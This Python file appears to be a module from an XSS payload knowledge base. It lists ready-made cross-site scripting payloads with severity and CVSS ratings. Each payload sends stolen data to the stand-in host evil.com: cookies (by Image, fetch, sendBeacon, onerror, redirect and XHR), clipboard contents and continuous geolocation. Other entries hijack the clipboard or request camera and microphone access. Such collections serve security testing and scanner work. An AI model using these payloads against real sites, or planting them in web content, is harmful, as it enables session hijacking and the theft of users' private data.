#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Data Exfiltration Payloads
"""

from ..models import PayloadEntry


COOKIE_STEALING_PAYLOADS = {
    "cookie_1": PayloadEntry(
        payload="<script>new Image().src='//evil.com/?c='+document.cookie</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Cookie exfil via Image",
        tags=["cookie", "exfil", "image"],
        reliability="high",
    ),
    "cookie_2": PayloadEntry(
        payload="<script>fetch('//evil.com/?c='+document.cookie)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Cookie exfil via fetch",
        tags=["cookie", "exfil", "fetch"],
        reliability="high",
    ),
    "cookie_3": PayloadEntry(
        payload="<script>navigator.sendBeacon('//evil.com',document.cookie)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Cookie exfil via sendBeacon",
        tags=["cookie", "exfil", "beacon"],
        reliability="high",
    ),
    "cookie_4": PayloadEntry(
        payload="<img src=x onerror=this.src='//evil.com/?c='+document.cookie>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Cookie exfil via img onerror",
        tags=["cookie", "exfil", "img"],
        reliability="high",
    ),
    "cookie_5": PayloadEntry(
        payload="<script>document.location='//evil.com/?c='+document.cookie</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Cookie exfil via redirect",
        tags=["cookie", "exfil", "redirect"],
        reliability="high",
    ),
    "cookie_6": PayloadEntry(
        payload="<script>var x=new XMLHttpRequest();x.open('GET','//evil.com/?c='+document.cookie);x.send()</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Cookie exfil via XHR",
        tags=["cookie", "exfil", "xhr"],
        reliability="high",
    ),
}

CLIPBOARD_PAYLOADS = {
    "clip_1": PayloadEntry(
        payload="<script>document.oncopy=e=>{e.clipboardData.setData('text/plain','malicious');e.preventDefault()}</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.5,
        description="Clipboard hijack on copy",
        tags=["clipboard", "copy", "hijack"],
        reliability="high",
    ),
    "clip_2": PayloadEntry(
        payload="<script>navigator.clipboard.writeText('malicious text')</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.5,
        description="Write to clipboard",
        tags=["clipboard", "write"],
        reliability="high",
    ),
    "clip_3": PayloadEntry(
        payload="<script>navigator.clipboard.readText().then(t=>fetch('//evil.com/?clip='+t))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Read clipboard and exfil",
        tags=["clipboard", "read", "exfil"],
        reliability="medium",
    ),
}

GEOLOCATION_PAYLOADS = {
    "geo_1": PayloadEntry(
        payload="<script>navigator.geolocation.getCurrentPosition(p=>fetch('//evil.com/?lat='+p.coords.latitude+'&lon='+p.coords.longitude))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.0,
        description="Geolocation exfil",
        tags=["geolocation", "exfil"],
        reliability="medium",
    ),
    "geo_2": PayloadEntry(
        payload="<script>navigator.geolocation.watchPosition(p=>fetch('//evil.com/?lat='+p.coords.latitude+'&lon='+p.coords.longitude))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Continuous geolocation tracking",
        tags=["geolocation", "tracking", "watch"],
        reliability="medium",
    ),
}

MEDIA_DEVICE_PAYLOADS = {
    "media_1": PayloadEntry(
        payload="<script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>fetch('//evil.com/stream'))</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Camera access request",
        tags=["camera", "media", "video"],
        reliability="low",
    ),
    "media_2": PayloadEntry(
        payload="<script>navigator.mediaDevices.getUserMedia({audio:true}).then(s=>fetch('//evil.com/stream'))</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Microphone access request",
        tags=["microphone", "media", "audio"],
        reliability="low",
    ),
}

# Combined database
EXFILTRATION_DATABASE = {
    **COOKIE_STEALING_PAYLOADS,
    **CLIPBOARD_PAYLOADS,
    **GEOLOCATION_PAYLOADS,
    **MEDIA_DEVICE_PAYLOADS,
}
EXFILTRATION_TOTAL = len(EXFILTRATION_DATABASE)
